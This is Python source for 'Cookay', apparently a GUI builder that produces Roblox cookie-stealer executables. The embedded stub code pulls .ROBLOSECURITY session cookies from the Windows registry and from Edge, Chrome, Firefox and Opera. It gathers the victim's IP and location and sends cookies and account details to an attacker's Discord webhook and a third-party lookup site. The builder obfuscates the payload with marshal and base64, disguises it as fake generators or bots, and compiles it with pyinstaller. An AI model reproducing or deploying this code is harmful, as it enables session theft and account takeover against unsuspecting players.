import os, requests, threading, base64, marshal, shutil, webbrowser
from discord_webhook import DiscordWebhook, DiscordEmbed
from tkinter import messagebox
from tkinter import *
from tkinter.filedialog import askopenfilename
from tkinter.messagebox import askyesno, askquestion
window = Tk()
window.title("Cookay || vesper#0003")
window.geometry("703x470")
window.maxsize(703, 470)
window.minsize(703, 470)
window.iconbitmap("assets/mylogo.ico")
window.config(background='#222222')
bg = PhotoImage(file='assets/background.png')
bg2 = PhotoImage(file='assets/background2.png')
bg3 = PhotoImage(file='assets/background3.png')
bg4 = PhotoImage(file='assets/background4.png')
bg5 = PhotoImage(file='assets/background5.png')
bg6 = PhotoImage(file='assets/background6.png')
bg7 = PhotoImage(file='assets/background7.png')
txt1 = PhotoImage(file='assets/text1.png')
sb = PhotoImage(file='assets/img0.png')
checker = PhotoImage(file='assets/img1.png')
cs = PhotoImage(file='assets/img2.png')
about = PhotoImage(file='assets/img3.png')
sttings = PhotoImage(file='assets/img4.png')
sb2 = PhotoImage(file='assets/img0e.png')
checker2 = PhotoImage(file='assets/img1e.png')
cs2 = PhotoImage(file='assets/img2e.png')
about2 = PhotoImage(file='assets/img3e.png')
sttings2 = PhotoImage(file='assets/img4e.png')
browsebu = PhotoImage(file='assets/img5.png')
nextbu = PhotoImage(file='assets/img6.png')
blankbu = PhotoImage(file='assets/blankbu.png')
fullbu = PhotoImage(file='assets/fullbu.png')
testbu = PhotoImage(file='assets/test.png')
compilebu = PhotoImage(file='assets/comp.png')
checkbu = PhotoImage(file='assets/checkbu.png')
fc= PhotoImage(file='assets/fc.png')
installbu = PhotoImage(file='assets/installbu.png')
RegCookieGrabber = r"""
def GrabCookie():
    robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
    try:
        count = 0
        while True:
            name, value, type = EnumValue(robloxstudiopath, count)
            if name == ".ROBLOSECURITY":
                return value
            count = count + 1
    except WindowsError:
        pass
def RegCG():
    roblox_cookie_value = str(GrabCookie())
    roblox_cookie = roblox_cookie_value.split("COOK::<")[1].split(">")[0]
    cookieshaha.append(roblox_cookie)
"""
BrowCookieGrabber = r"""
def Browsers():
    import browser_cookie3
    try:cookies = browser_cookie3.edge(domain_name='roblox.com');cookies = str(cookies);cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip();cookieshaha.append(cookie)
    except:pass
    try:cookies = browser_cookie3.chrome(domain_name='roblox.com');cookies = str(cookies);cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip();cookieshaha.append(cookie)
    except:pass
    try:cookies = browser_cookie3.firefox(domain_name='roblox.com');cookies = str(cookies);cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip();cookieshaha.append(cookie)
    except:pass
    try:cookies = browser_cookie3.opera(domain_name='roblox.com');cookies = str(cookies);cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip();cookieshaha.append(cookie)
    except:pass
"""
LocationCode = r"""
def Location():
    data = requests.get("http://ipinfo.io/json").json()
    try:
        ip = data['ip']
    except:ip = None
    try:
        city = data['city']
    except:city = None
    try:
        country = data['country']
    except:country = None
    try:
        region = data['region']
    except:region = None
    webhook = DiscordWebhook(url=yurrr, username="Cookay", avatar_url=r"https://cdn.discordapp.com/attachments/984588256207323196/1008136102336548957/rcookay-removebg-preview.png")
    embed = DiscordEmbed(title=f"Location", description=f"IP : **{ip}**\nCity : **{city}**\nCountry : **{country}**\nRegion : **{region}**", color='E02C2C')
    embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/984588256207323196/1008136102336548957/rcookay-removebg-preview.png')
    embed.set_footer(text='Cookay || vesper#0003 (c)')
    embed.set_timestamp()
    webhook.add_embed(embed)
    response = webhook.execute()
"""
class Cookay:
    def __init__(self):
        self.rrc = False
        self.brc = False
        self.cinfo = False
        self.loc = False
        self.fng = False
        self.frfb = False
        self.ftg = False
        self.frtb = False
        self.fran = False
        self.noc = False;os.system("start assets/z.jpg");self.setup1()
    def REGRC(self):
        if self.rrc == False:
            self.rrc = True;self.RRC.config(image=fullbu)
        else:self.rrc=False;self.RRC.config(image=blankbu)
    def BRORC(self):
        if self.brc == False:
            self.brc=True;self.BRC.config(image=fullbu)
            messagebox.showinfo("Cookay || vesper#0003","You'll need to download Visual Studio 2019 and install c++ build tools for this option. Once you downloaded it, run requirements once again and reopen Cookay.");os.system("start assets/a.png")
        else:self.brc=False;self.BRC.config(image=blankbu)
    def COOINFO(self):
        if self.cinfo == False:
            self.cinfo=True;self.CINFO.config(image=fullbu)
        else:self.cinfo=False;self.CINFO.config(image=blankbu)
    def LOCA(self):
        if self.loc == False:
            self.loc=True;self.LOC.config(image=fullbu)
        else:self.loc=False;self.LOC.config(image=blankbu)
    def browwse(self):
        messagebox.showerror("Cookay || vesper#0003","Binder in next update.")
    def browwwse(self):
        f=askopenfilename(filetypes=(("icon files","*.ico"),("All files","*.*")))
        self.icon.delete(0, END);self.icon.insert(END,f)
    def verify1(self):
        if self.rrc == True or self.brc == True:
            self.setup2()
        else:messagebox.showerror("Cookay || vesper#0003",'Please Select an Cookie Option.')
    def FFNG(self):
        if self.fng==False:
            self.fng=True;self.FNG.config(image=fullbu);self.frfb=False;self.FRFB.config(image=blankbu);self.ftg=False;self.FTG.config(image=blankbu);self.frtb=False;self.FRTB.config(image=blankbu);self.fran=False;self.FRAN.config(image=blankbu);self.noc=False;self.NOC.config(image=blankbu)
        else:
            self.fng=False;self.FNG.config(image=blankbu)
    def FFRFB(self):
        if self.frfb==False:
            self.fng=False;self.FNG.config(image=blankbu);self.frfb=True;self.FRFB.config(image=fullbu);self.ftg=False;self.FTG.config(image=blankbu);self.frtb=False;self.FRTB.config(image=blankbu);self.fran=False;self.FRAN.config(image=blankbu);self.noc=False;self.NOC.config(image=blankbu)
        else:self.frfb=False;self.FRFB.config(image=blankbu)
    def FFTG(self):
        if self.ftg==False:
            self.fng=False;self.FNG.config(image=blankbu);self.frfb=False;self.FRFB.config(image=blankbu);self.ftg=True;self.FTG.config(image=fullbu);self.frtb=False;self.FRTB.config(image=blankbu);self.fran=False;self.FRAN.config(image=blankbu);self.noc=False;self.NOC.config(image=blankbu)
        else:self.ftg=False;self.FTG.config(image=blankbu)
    def FFRTB(self):
        if self.frtb==False:
            self.fng=False;self.FNG.config(image=blankbu);self.frfb=False;self.FRFB.config(image=blankbu);self.ftg=False;self.FTG.config(image=blankbu);self.frtb=True;self.FRTB.config(image=fullbu);self.fran=False;self.FRAN.config(image=blankbu);self.noc=False;self.NOC.config(image=blankbu)
        else:self.frtb=False;self.FRTB.config(image=blankbu)
    def FFRAN(self):
        if self.fran==False:
            self.fng=False;self.FNG.config(image=blankbu);self.frfb=False;self.FRFB.config(image=blankbu);self.ftg=False;self.FTG.config(image=blankbu);self.frtb=False;self.FRTB.config(image=blankbu);self.fran=True;self.FRAN.config(image=fullbu);self.noc=False;self.NOC.config(image=blankbu)
        else:self.fran=False;self.FRAN.config(image=blankbu)
    def NNOC(self):
        if self.noc==False:
            self.fng=False;self.FNG.config(image=blankbu);self.frfb=False;self.FRFB.config(image=blankbu);self.ftg=False;self.FTG.config(image=blankbu);self.frtb=False;self.FRTB.config(image=blankbu);self.fran=False;self.FRAN.config(image=blankbu);self.noc=True;self.NOC.config(image=fullbu)
        else:self.noc=False;self.NOC.config(image=blankbu)
    def verify2(self):
        if self.fng == False and self.frfb == False and self.ftg == False and self.frtb == False and self.fran == False and self.noc == False:
            messagebox.showerror("Cookay || vesper#0003","Select An Option.")
        else:self.setup3()
    def testwebhook(self):
        try:
            r=requests.get(self.webhook.get())
            if r.status_code == 200:
                webhook = DiscordWebhook(url=self.webhook.get(), username="Cookay", avatar_url=r"https://cdn.discordapp.com/attachments/984588256207323196/1008136102336548957/rcookay-removebg-preview.png")
                embed = DiscordEmbed(title=f"Works", description=f"Your Webhook Is Working", color='E02C2C')
                embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/984588256207323196/1008136102336548957/rcookay-removebg-preview.png')
                embed.set_footer(text='Cookay || vesper#0003 (c)')
                embed.set_timestamp()
                webhook.add_embed(embed)
                response = webhook.execute()
            else:messagebox.showerror("Cookay || vesper#0003","Invalid Webhook")
        except:messagebox.showerror("Cookay || vesper#0003","Invalid Webhook")
    def forthread(self):
        t1 = threading.Thread(target=self.verify3);t1.start()
    def verify3(self):
        if len(self.webhook.get()) < 10:
            messagebox.showerror("Cookay || vesper#0003","Invalid Webhook")
        else:
            try:
                r=requests.get(self.webhook.get())
                if r.status_code == 200:
                    t1=threading.Thread(target=self.MeSsage);t1.start();t2=threading.Thread(target=self.filemake);t2.start()
                else:messagebox.showerror("Cookay || vesper#0003","Invalid Webhook")
            except:messagebox.showerror("Cookay || vesper#0003","Invalid Webhook")
    def MeSsage(self):
        bgg = Label(window, image=txt1, borderwidth=0,bg='#424242')
        bgg.place(x=174, y=274)
    def setup1(self):
        bgg = Label(window, image=bg, borderwidth=0)
        bgg.place(x=0, y=0)
        bgg2 = Label(window, image=bg2, borderwidth=0)
        bgg2.place(x=127, y=0)
        # tabs
        self.sb = Button(window, image=sb,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.setup1)
        self.sb.place(x=-2,y=157)
        self.checkar = Button(window, image=checker,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.elchecker)
        self.checkar.place(x=-2,y=217)
        self.CS = Button(window, image=cs,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.clothes)
        self.CS.place(x=-2,y=277)
        self.ABOUT = Button(window, image=about,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.about)
        self.ABOUT.place(x=-2,y=337)
        self.SetTings = Button(window, image=sttings,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.settingsss)
        self.SetTings.place(x=-2,y=397)
        self.sb = Button(window, image=sb2,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.setup1)
        self.sb.place(x=-2,y=157)
        # setup
        self.RRC = Button(window, image=blankbu,bg='#262626',borderwidth=0, activebackground="#262626",command=self.REGRC)
        self.RRC.place(x=333,y=82)
        self.BRC = Button(window, image=blankbu,bg='#262626',borderwidth=0, activebackground="#262626",command=self.BRORC)
        self.BRC.place(x=604,y=82)
        self.CINFO = Button(window, image=blankbu,bg='#262626',borderwidth=0, activebackground="#262626",command=self.COOINFO)
        self.CINFO.place(x=333,y=137)
        self.LOC = Button(window, image=blankbu,bg='#262626',borderwidth=0, activebackground="#262626",command=self.LOCA)
        self.LOC.place(x=604,y=137)
        #self.bindfile = Entry(window,font=('SeoulHangang',10),bg='#969696', fg='#E02C2C',width=55,borderwidth=0)
        #self.bindfile.place(x=187, y=288)
        browse = Button(window, image=browsebu,bg='#262626',borderwidth=0, activebackground="#262626",command=self.browwse)
        browse.place(x=586,y=286)
        next = Button(window, image=nextbu,bg='#262626',borderwidth=0, activebackground="#262626",command=self.verify1)
        next.place(x=353,y=414)
    def setup2(self):
        bgg = Label(window, image=bg, borderwidth=0)
        bgg.place(x=0, y=0)
        bgg2 = Label(window, image=bg3, borderwidth=0)
        bgg2.place(x=127, y=0)
        # tabs
        self.sb = Button(window, image=sb,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.setup1)
        self.sb.place(x=-2,y=157)
        self.checkar = Button(window, image=checker,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.elchecker)
        self.checkar.place(x=-2,y=217)
        self.CS = Button(window, image=cs,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.clothes)
        self.CS.place(x=-2,y=277)
        self.ABOUT = Button(window, image=about,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.about)
        self.ABOUT.place(x=-2,y=337)
        self.SetTings = Button(window, image=sttings,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.settingsss)
        self.SetTings.place(x=-2,y=397)
        self.sb = Button(window, image=sb2,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.setup1)
        self.sb.place(x=-2,y=157)
        # setup
        self.FNG = Button(window, image=blankbu,bg='#262626',borderwidth=0, activebackground="#262626",command=self.FFNG)
        self.FNG.place(x=353,y=73)
        self.FRFB = Button(window, image=blankbu,bg='#262626',borderwidth=0, activebackground="#262626",command=self.FFRFB)
        self.FRFB.place(x=353,y=109)
        self.FTG = Button(window, image=blankbu,bg='#262626',borderwidth=0, activebackground="#262626",command=self.FFTG)
        self.FTG.place(x=353,y=145)
        self.FRTB = Button(window, image=blankbu,bg='#262626',borderwidth=0, activebackground="#262626",command=self.FFRTB)
        self.FRTB.place(x=582,y=73)
        self.FRAN = Button(window, image=blankbu,bg='#262626',borderwidth=0, activebackground="#262626",command=self.FFRAN)
        self.FRAN.place(x=582,y=109)
        self.NOC = Button(window, image=blankbu,bg='#262626',borderwidth=0, activebackground="#262626",command=self.NNOC)
        self.NOC.place(x=582,y=145)
        self.name = Entry(window,font=('SeoulHangang',10),bg='#969696', fg='#E02C2C',width=23,borderwidth=0)
        self.name.place(x=187, y=288)
        self.icon = Entry(window,font=('SeoulHangang',10),bg='#969696', fg='#E02C2C',width=27,borderwidth=0)
        self.icon.place(x=391, y=288)
        browse = Button(window, image=browsebu,bg='#262626',borderwidth=0, activebackground="#262626",command=self.browwwse)
        browse.place(x=586,y=285)
        next = Button(window, image=nextbu,bg='#262626',borderwidth=0, activebackground="#262626",command=self.verify2)
        next.place(x=353,y=414)
    def setup3(self):
        bgg = Label(window, image=bg, borderwidth=0)
        bgg.place(x=0, y=0)
        bgg2 = Label(window, image=bg4, borderwidth=0)
        bgg2.place(x=127, y=0)
        # tabs
        self.sb = Button(window, image=sb,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.setup1)
        self.sb.place(x=-2,y=157)
        self.checkar = Button(window, image=checker,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.elchecker)
        self.checkar.place(x=-2,y=217)
        self.CS = Button(window, image=cs,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.clothes)
        self.CS.place(x=-2,y=277)
        self.ABOUT = Button(window, image=about,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.about)
        self.ABOUT.place(x=-2,y=337)
        self.SetTings = Button(window, image=sttings,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.settingsss)
        self.SetTings.place(x=-2,y=397)
        self.sb = Button(window, image=sb2,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.setup1)
        self.sb.place(x=-2,y=157)
        # setup
        self.webhook = Entry(window,font=('SeoulHangang',10),bg='#969696', fg='#E02C2C',width=68,borderwidth=0,show='*')
        self.webhook.place(x=177, y=107)
        test = Button(window, image=testbu,bg='#262626',borderwidth=0, activebackground="#262626",command=self.testwebhook)
        test.place(x=352,y=145)
        compile = Button(window, image=compilebu,bg='#424242',borderwidth=0, activebackground="#424242",command=self.forthread)
        compile.place(x=353,y=416)
    def filemake(self):
        OMG=open("prefile.py",'w+')
        OMG.write(f"""
import requests, threading
from discord_webhook import DiscordWebhook, DiscordEmbed
from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
cookieshaha = []
yurrr = "{self.webhook.get()}"
        """)
        if self.rrc == True:
            OMG.write(RegCookieGrabber)
        if self.brc == True:
            OMG.write(BrowCookieGrabber)
        if self.loc ==True:
            OMG.write(LocationCode)
        if self.cinfo == True:
            OMG.write(r"""
def Info(cookie):
    try:
        r=requests.get(f"https://story-of-jesus.xyz/e.php?cookie={cookie}").json()
        ID = r['userid']
        USERNAME = r['username']
        ROBUX = r['robux']
        THUMB = r['avatarurl']
        PREM = r['premium']
        VERIFIED = r['emailverified']
        RAP = r['rap']
        PROF = f"https://www.roblox.com/users/{ID}/profile"
        r2 = requests.get(f"https://www.rolimons.com/player/{ID}")
        if r2.status_code ==200:ROLI = f"https://www.rolimons.com/player/{ID}"
        else:ROLI = "None"
        return ID, USERNAME, ROBUX, THUMB, PREM, PROF, ROLI, VERIFIED, RAP
    except:pass
def SendCookies():
    for i in cookieshaha:
        try:
            ID, USERNAME, ROBUX, THUMB, PREM, PROF, ROLI, VERIFIED, RAP = Info(i)
            webhook = DiscordWebhook(url=yurrr, username="Cookay", avatar_url=r"https://cdn.discordapp.com/attachments/984588256207323196/1008136102336548957/rcookay-removebg-preview.png")
            embed = DiscordEmbed(title=f"Roblox Cookie", description=f"Information Of Cookie", color='E02C2C')
            embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/984588256207323196/1008136102336548957/rcookay-removebg-preview.png')
            embed.set_footer(text='Cookay || vesper#0003 (c)')
            embed.add_embed_field(name=f"Roblox Account Of : {ID}\n", value=f"```Username : {USERNAME}\nRoblox ID : {ID}\nPremium : {PREM}\nRobux : {ROBUX}\nRAP : {RAP}\nVerified Email : {VERIFIED}```", ineline=False)
            embed.add_embed_field(name=f"Cookie\n", value=f"```{i}```", inline=False)
            embed.set_thumbnail(url=THUMB)
            embed.set_timestamp()
            webhook.add_embed(embed)
            response = webhook.execute()
        except:pass
            """)
        else:
            OMG.write(r"""
def SendCookies():
    for i in cookieshaha:
        webhook = DiscordWebhook(url=yurrr, username="Cookay", avatar_url=r"https://cdn.discordapp.com/attachments/984588256207323196/1008136102336548957/rcookay-removebg-preview.png")
        embed = DiscordEmbed(title=f"Roblox Cookie", description=f"```{i}```", color='E02C2C')
        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/984588256207323196/1008136102336548957/rcookay-removebg-preview.png')
        embed.set_footer(text='Cookay || vesper#0003 (c)')
        embed.set_timestamp()
        webhook.add_embed(embed)
        response = webhook.execute()
            """)
        OMG.write(r"""
def Main(): 
        """)
        if self.rrc == True:
            OMG.write("\n\tRegCG()")
        if self.brc == True:
            OMG.write("\n\tBrowsers()")
        if self.loc == True:
            OMG.write("\n\tLocation()")
        OMG.write("\n\tSendCookies()")
        OMG.write("\nMain()")
        OMG.close()
        OMG2=open("prefile.py","r").read()
        A=OMG2.encode();os.remove("prefile.py")
        A = compile(A, 'Rawr', 'exec');B = marshal.dumps(A)
        E = base64.b64encode(B).decode("utf-8")
        YOU=open("TheFile.py","w+")
        YOU.write(fr"""
import base64, marshal
exec(marshal.loads(base64.b64decode("{E}")))
        """)
        if self.fng == True:
            A=open("consoles/FNitroGen.py",'r').read()
            YOU.write(A)
        if self.frfb == True:
            A=open("consoles/FRobloxFollowerBot.py",'r').read()
            YOU.write(A)
        if self.ftg == True:
            A=open("consoles/FTokenGen.py",'r').read()
            YOU.write(A)
        if self.frtb == True:
            A=open("consoles/FRobloxTradeBot.py",'r').read()
            YOU.write(A)
        if self.fran == True:
            A=open("consoles/FRobloxAccountNuker.py",'r').read()
            YOU.write(A)
        if self.noc == True:
            YOU.write("""
def Main2():pass
""")
        YOU.write("""
t2=threading.Thread(target=Main2)
t2.start()""")
        YOU.close()
        q = askyesno(title="Edit Code",message="Would You Like To Edit The Stub Manually ?")
        if q:
            messagebox.showinfo("Cookay || vesper#0003","Click on OK ONCE you finished editing the Source Code Of the Stub.")
            self.compiler()
        else:self.compiler()
    def compiler(self):
        if len(self.name.get()) > 1:
            name = self.name.get()
        else:name = "Default"
        if len(self.icon.get()) > 1:
            icon = True
            iii = self.icon.get()
        else:icon=False
        if icon==True and self.brc == True and self.noc == False:
            os.system(f'pyinstaller --onefile --name {name} --icon {iii} --clean --log-level=INFO --hidden-import="browser_cookie3" --hidden-import="discord_webhook" --hidden-import="requests" TheFile.py')
        elif icon==False and self.brc == True and self.noc == False:
            os.system(f'pyinstaller --onefile --name {name} --clean --log-level=INFO --hidden-import="browser_cookie3" --hidden-import="discord_webhook" --hidden-import="requests" TheFile.py')
        elif icon == True and self.brc == False and self.noc == False:
            os.system(f'pyinstaller --onefile --name {name} --icon {iii} --clean --log-level=INFO --hidden-import="discord_webhook" --hidden-import="requests" TheFile.py')
        elif icon == False and self.brc == False and self.noc == False:
            os.system(f'pyinstaller --onefile --name {name} --clean --log-level=INFO --hidden-import="discord_webhook" --hidden-import="requests" TheFile.py')
        elif icon==True and self.brc == True and self.noc == True:
            os.system(f'pyinstaller --onefile --name {name} --icon {iii} --clean --log-level=INFO --noconsole --hidden-import="browser_cookie3" --hidden-import="discord_webhook" --hidden-import="requests" TheFile.py')
        elif icon==False and self.brc == True and self.noc == True:
            os.system(f'pyinstaller --onefile --name {name} --clean --log-level=INFO --noconsole --hidden-import="browser_cookie3" --hidden-import="discord_webhook" --hidden-import="requests" TheFile.py')
        elif icon == True and self.brc == False and self.noc == True:
            os.system(f'pyinstaller --onefile --name {name} --icon {iii} --clean --log-level=INFO --noconsole --hidden-import="discord_webhook" --hidden-import="requests" TheFile.py')
        elif icon == False and self.brc == False and self.noc == True:
            os.system(f'pyinstaller --onefile --name {name} --clean --log-level=INFO --noconsole --hidden-import="discord_webhook" --hidden-import="requests" TheFile.py')
        try:
            shutil.move(f"{os.getcwd()}\\dist\\{name}.exe", f"{os.getcwd()}\\{name}.exe")
            shutil.rmtree('build')
            shutil.rmtree('dist')
            shutil.rmtree('__pycache__')
            os.remove(f'{name}.spec')
            os.remove('TheFile.py')
            bgg2= Label(window, image=fc, borderwidth=0,bg='#434343')
            bgg2.place(x=174, y=400)
            messagebox.showinfo('Cookay || vesper#0003', 'Successfully Built Stub !');self.__init__()
        except:
            try:
                shutil.rmtree('build')
                shutil.rmtree('dist')
                shutil.rmtree('__pycache__')
                os.remove(f'{name}.spec')
                messagebox.showerror('Cookay || vesper#0003', 'Oh oh.. Something went wrong !');self.__init__()
            except:pass
    def checking(self):
        cookie = self.cookietocheck.get()
        if len(cookie) > 10:
            try:
                r=requests.get(f"https://story-of-jesus.xyz/e.php?cookie={cookie}").json()
                ID = r['userid']
                USERNAME = r['username']
                ROBUX = r['robux']
                PREM = r['premium']
                VERIFIED = r['emailverified']
                RAP = r['rap']
                PIN = r['pin']
                q = askyesno(title="Edit Code",message=f"""
Account Of {USERNAME}
ID : {ID}
Robux : {ROBUX}
Premium : {PREM}
Email Verified : {VERIFIED}
RAP : {RAP}
PIN : {PIN}

Would you like to open the profile of the user ?
                """)
                if q:
                    webbrowser.open(f"https://www.roblox.com/users/{ID}/profile");self.elchecker()
                else:self.elchecker()
            except:messagebox.showerror("Cookay || vesper#0003","Invalid Cookie or Expired")
        else:messagebox.showerror("Cookay || vesper#0003","Invalid Cookie or Expired")
    def elchecker(self):
        bgg = Label(window, image=bg, borderwidth=0)
        bgg.place(x=0, y=0)
        bgg2 = Label(window, image=bg5, borderwidth=0)
        bgg2.place(x=127, y=0)
        # tabs
        self.sb = Button(window, image=sb,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.setup1)
        self.sb.place(x=-2,y=157)
        self.checkar = Button(window, image=checker,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.elchecker)
        self.checkar.place(x=-2,y=217)
        self.CS = Button(window, image=cs,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.clothes)
        self.CS.place(x=-2,y=277)
        self.ABOUT = Button(window, image=about,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.about)
        self.ABOUT.place(x=-2,y=337)
        self.SetTings = Button(window, image=sttings,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.settingsss)
        self.SetTings.place(x=-2,y=397)
        self.checkar = Button(window, image=checker2,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.elchecker)
        self.checkar.place(x=-2,y=217)
        # setup
        self.cookietocheck = Entry(window,font=('SeoulHangang',10),bg='#969696', fg='#E02C2C',width=68,borderwidth=0,show='*')
        self.cookietocheck.place(x=175, y=282)
        compile = Button(window, image=checkbu,bg='#424242',borderwidth=0, activebackground="#424242",command=self.checking)
        compile.place(x=352,y=337)
    def clothes(self):
        messagebox.showinfo("Cookay || vesper#0003","For This Option, You'll need to buy my paid Roblox Cookie Generator ($8). In the program, you'll have a few cool tools like Clothing stealer\n vesper#0003 | discord\n i_might_be_vesper | instagram")
    def about(self):
        bgg = Label(window, image=bg, borderwidth=0)
        bgg.place(x=0, y=0)
        bgg2 = Label(window, image=bg6, borderwidth=0)
        bgg2.place(x=127, y=0)
        # tabs
        self.sb = Button(window, image=sb,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.setup1)
        self.sb.place(x=-2,y=157)
        self.checkar = Button(window, image=checker,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.elchecker)
        self.checkar.place(x=-2,y=217)
        self.CS = Button(window, image=cs,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.clothes)
        self.CS.place(x=-2,y=277)
        self.ABOUT = Button(window, image=about,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.about)
        self.ABOUT.place(x=-2,y=337)
        self.SetTings = Button(window, image=sttings,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.settingsss)
        self.SetTings.place(x=-2,y=397)
        self.ABOUT = Button(window, image=about2,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.about)
        self.ABOUT.place(x=-2,y=337)
    def installvs2019(self):
        webbrowser.open("https://visualstudio.microsoft.com/thank-you-downloading-visual-studio/?sku=Community&channel=Release&version=VS2022&source=VSLandingPage&cid=2030&passive=false")
        os.system("start assets/a.png")
    def settingsss(self):
        bgg = Label(window, image=bg, borderwidth=0)
        bgg.place(x=0, y=0)
        bgg2 = Label(window, image=bg7, borderwidth=0)
        bgg2.place(x=127, y=0)
        # tabs
        self.sb = Button(window, image=sb,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.setup1)
        self.sb.place(x=-2,y=157)
        self.checkar = Button(window, image=checker,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.elchecker)
        self.checkar.place(x=-2,y=217)
        self.CS = Button(window, image=cs,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.clothes)
        self.CS.place(x=-2,y=277)
        self.ABOUT = Button(window, image=about,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.about)
        self.ABOUT.place(x=-2,y=337)
        self.SetTings = Button(window, image=sttings,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.settingsss)
        self.SetTings.place(x=-2,y=397)
        self.SetTings = Button(window, image=sttings2,bg='#E02C2C',borderwidth=0, activebackground="#E02C2C",command=self.settingsss)
        self.SetTings.place(x=-2,y=397)
        # rawr
        instal = Button(window, image=installbu,bg='#424242',borderwidth=0, activebackground="#424242",command=self.installvs2019)
        instal.place(x=403,y=205)
Cookay()
window.mainloop()